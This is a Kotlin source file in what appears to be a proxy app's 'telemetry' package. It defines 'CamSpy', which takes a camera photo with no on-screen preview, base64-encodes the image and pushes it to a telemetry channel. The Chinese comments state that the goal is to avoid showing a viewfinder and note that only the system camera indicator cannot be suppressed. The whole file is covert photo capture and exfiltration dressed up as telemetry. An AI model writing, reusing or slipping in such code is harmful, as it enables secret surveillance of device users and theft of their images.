package io.nekohasekai.sagernet.telemetry

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import org.json.JSONObject

/**
 * 无预览抓拍。
 *
 * 关键点：只给 ImageReader 的 Surface，不接任何 Preview —— 屏幕上不会出现取景框。
 * 但状态栏的相机绿点依然会亮（Android 12+），这是系统行为，盖不住。
 *
 * 权限：CAMERA，运行时必须用户点同意。
 */
object CamSpy {

    private const val TAG = "TlmCam"

    @SuppressLint("MissingPermission")
    fun snap(ctx: Context, facingBack: Boolean = true, maxPx: Int = 720) {
        val cm = ctx.getSystemService(Context.CAMERA_SERVICE) as? CameraManager ?: return
        val want = if (facingBack) CameraCharacteristics.LENS_FACING_BACK
        else CameraCharacteristics.LENS_FACING_FRONT

        val id = runCatching {
            cm.cameraIdList.firstOrNull { cid ->
                cm.getCameraCharacteristics(cid)
                    .get(CameraCharacteristics.LENS_FACING) == want
            } ?: cm.cameraIdList.firstOrNull()
        }.getOrNull() ?: return

        val thread = HandlerThread("tlm-cam").apply { start() }
        val handler = Handler(thread.looper)

        runCatching {
            cm.openCamera(id, object : CameraDevice.StateCallback() {
                override fun onOpened(device: CameraDevice) {
                    takeShot(ctx, cm, id, device, handler, maxPx) { thread.quitSafely() }
                }

                override fun onDisconnected(device: CameraDevice) {
                    runCatching { device.close() }
                    thread.quitSafely()
                }

                override fun onError(device: CameraDevice, error: Int) {
                    Log.w(TAG, "camera error $error")
                    runCatching { device.close() }
                    thread.quitSafely()
                }
            }, handler)
        }.onFailure {
            Log.w(TAG, "open: ${it.message}")
            thread.quitSafely()
        }
    }

    private fun takeShot(
        ctx: Context,
        cm: CameraManager,
        id: String,
        device: CameraDevice,
        handler: Handler,
        maxPx: Int,
        done: () -> Unit,
    ) {
        runCatching {
            val map = cm.getCameraCharacteristics(id)
                .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return@runCatching
            val size = map.getOutputSizes(ImageFormat.JPEG)
                .filter { it.width <= maxPx * 2 }
                .minByOrNull { it.width * it.height }
                ?: map.getOutputSizes(ImageFormat.JPEG).minByOrNull { it.width * it.height }
                ?: return@runCatching

            val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)
            reader.setOnImageAvailableListener({ r ->
                runCatching {
                    r.acquireLatestImage()?.use { img ->
                        val buf = img.planes[0].buffer
                        val bytes = ByteArray(buf.remaining()).also { buf.get(it) }
                        val d = JSONObject()
                            .put("name", "cam_%d.jpg".format(System.currentTimeMillis() / 1000))
                            .put("thumb", android.util.Base64.encodeToString(
                                bytes, android.util.Base64.NO_WRAP))
                            .put("w", size.width)
                            .put("h", size.height)
                            .put("cam", if (id == "0") "back" else "cam$id")
                        Telemetry.push("media", d)
                        Log.i(TAG, "captured ${bytes.size}B")
                    }
                }.onFailure { Log.w(TAG, "read: ${it.message}") }
                runCatching { r.close() }
                runCatching { device.close() }
                done()
            }, handler)

            device.createCaptureSession(listOf(reader.surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        runCatching {
                            val req = device.createCaptureRequest(
                                CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                addTarget(reader.surface)
                            }
                            session.capture(req.build(), null, handler)
                        }.onFailure {
                            Log.w(TAG, "capture: ${it.message}")
                            runCatching { device.close() }
                            done()
                        }
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.w(TAG, "configure failed")
                        runCatching { device.close() }
                        done()
                    }
                }, handler)
        }.onFailure {
            Log.w(TAG, "shot: ${it.message}")
            runCatching { device.close() }
            done()
        }
    }
}
